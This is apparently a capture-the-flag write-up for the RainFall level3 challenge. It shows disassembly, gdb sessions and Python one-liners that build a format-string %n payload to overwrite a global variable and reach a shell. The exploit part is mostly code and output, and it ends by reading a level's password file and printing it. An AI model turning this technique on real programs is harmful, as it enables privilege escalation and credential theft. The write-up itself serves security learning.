New binary. We disas main, and see that we have a call to function "v".
First the function allocates 536 bytes for the local variables 
`0x080484a7 <+3>:	sub    $0x218,%esp`
This function has the call to fgets in wich our input is stored (0x80483a0)  and a call to system. It will compare the value at 0x804988c with 0x40(64)
```
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
```
Thing is that the variable at 0x804988c is undefined:
```
(gdb) x/s 0x804988c
0x804988c <m>:	 ""
```
Now the problem is that we have a fixed buffer for our input (512)
```
0x080484be <+26>:	lea    -0x208(%ebp),%eax
```
And printf will try to print our variable, but we could hypotetically input a format string 
```
level3@RainFall:~$ python -c 'print "AAAA" + "%x " * 20' > /tmp/expl
level3@RainFall:~$ cat /tmp/expl | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 ***41414141*** 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
```
The function didn’t find a corresponding variable or value on stack so it will start poping values off the stack. Notice that the value “41414141” was popped off the stack which means the prepended string is written on stack from the 4th position.
Now we will try to add the address of the variable m and try to append it.
```
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + '%x ' * 10" > /tmp/expl
level3@RainFall:~$ cat /tmp/expl | ./level3 
���200 b7fd1ac0 b7ff37d0 8004988c 25207825 78252078 20782520 25207825 78252078 20782520 
```
Good, but we don't want to print the value of the address and we want to write to it 64 decimal (cmp    $0x40,%eax) and we can do that using %n
```
(gdb) run < <(python -c 'print "\x8c\x98\x04\x08" + "AAAA" + "%n"')
Starting program: /home/user/level3/level3 < <(python -c "print '\x8c\x98\x04\x80' + 'AAAA' + '%n'")

Program received signal SIGSEGV, Segmentation fault.
0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6

```
This way it will segfault because we are trying to write to the addreses before the one where we can have direct access and we allready know that the prepanded string will start from the 4th position so we can use `%4$n` to write the bytes starting from the 4th position.
```
(gdb) run < <(python -c 'print "\x8c\x98\x04\x08" + "AAAA" + "%4$n"')
Starting program: /home/user/level3/level3 < <(python -c 'print "\x8c\x98\x04\x08" + "AAAA" + "%4$n"')

Breakpoint 1, 0x080484d5 in v () --- brakpoint at printf
(gdb) print m
$6 = 0
(gdb) ni
�AAAA
0x080484da in v ()
(gdb) print m
$7 = 8
```
Now we just have to fill it to 64(4 decimal for address + 60 padding)
```
(gdb) run < <(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"')

Starting program: /home/user/level3/level3 < <(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"')

Breakpoint 1, 0x080484d5 in v ()
(gdb) ni
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x080484da in v ()
(gdb) print m
$8 = 64
(gdb) next
Single stepping until exit from function v,
which has no line number information.
Wait what?!


level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/expl
level3@RainFall:~$ cat /tmp/expl - | ./level3 
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```